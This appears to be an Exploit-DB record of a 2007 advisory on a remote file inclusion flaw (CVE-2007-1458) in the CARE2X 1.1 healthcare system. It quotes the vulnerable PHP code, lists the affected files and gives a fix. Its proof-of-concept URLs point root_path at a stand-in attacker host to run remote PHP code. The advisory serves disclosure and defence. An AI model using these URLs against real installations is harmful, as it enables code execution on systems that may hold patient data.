{
  "id": "3472",
  "title": "CARE2X 1.1 - &#039;ROOT_PATH&#039; Remote File Inclusion",
  "cve": "CVE-2007-1458",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_72$2007\r\n\r\n-------------------------------------------------------------------------\r\n[ECHO_ADV_72$2007] CARE2X (root_path) Remote File Inclusion Vulnerability\r\n-------------------------- ----------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: March, 13th 2007\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv72-theday-2007.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: CARE2X\r\nversion\t\t: 1.1\r\nURL\t\t: http://www.care2x.org\r\n\r\nCare2x integrates data, functions and workflows in a healthcare environment. \r\nIt is currently composed of four major components. \r\nEach of these components can also function individually.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\n- Invalid include_once function at include/inc_checkdate_lang.php\r\n-----------------------include/inc_checkdate_lang.php------------\r\n\r\n<?\r\nif(file_exists($root_path.\"language/$lang/lang_\".$lang.\"_checkdate.php\")) include_once($root_path.\"language/$lang/lang_\".$lang.\"_checkdate.php\");\r\n else include_once($root_path.\"language/en/lang_en_checkdate.php\");\r\nif(file_exists($root_path.\"language/$lang/lang_\".$lang.\"_date_time.php\")) include_once($root_path.\"language/$lang/lang_\".$lang.\"_date_time.php\");\r\n else include_once($root_path.\"language/en/lang_en_date_time.php\");\r\n?>\r\n\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$root_path\" parameter in inc_checkdate_lang.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nalso affected files :\r\n\r\ninclude/inc_charset_fx.php\r\ninclude/inc_config_color.php\r\ninclude/inc_currency_set.php\r\ninclude/inc_db_makelink.php\r\ninclude/inc_diagnostics_report_fx.php\r\ninclude/inc_environment_global.php\r\ninclude/inc_front_chain_lang.php\r\ninclude/inc_init_crypt.php\r\ninclude/inc_load_copyrite.php\r\ninclude/inc_news_save.php\r\nmain/barcode-labels.php\r\nmain/chg-color.php\r\nmain/config_options_gui_template.php\r\nmain/config_options_mascot.php\r\nmain/diagnostics-report-index.php\r\n\r\n\r\nand More ....\r\n\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~\r\n\r\nhttp://localhost/care2x/include/inc_checkdate_lang.php?root_path=http://atacker.com/inject.txt?\r\nhttp://localhost/care2x/include/inc_news_save.php?root_path=http://atacker.com/inject.txt?\r\nhttp://localhost/care2x/main/diagnostics-report-index.php?root_path=http://atacker.com/inject.txt?\r\nhttp://localhost/care2x/main/config_options_mascot.php?root_path=http://atacker.com/inject.txt?\r\n\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Sanitize variable $root_path affected files.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy Nice Girl\r\n~ az001,bomm_3x,matdhule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~\r\n     EcHo Research & Development Center\r\n     http://advisories.echo.or.id\r\n     erdc[at]echo[dot]or[dot]id\r\n     the_day[at]echo[dot]or[dot]id\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2007-03-13]",
  "url": "https://www.exploit-db.com/exploits/3472"
}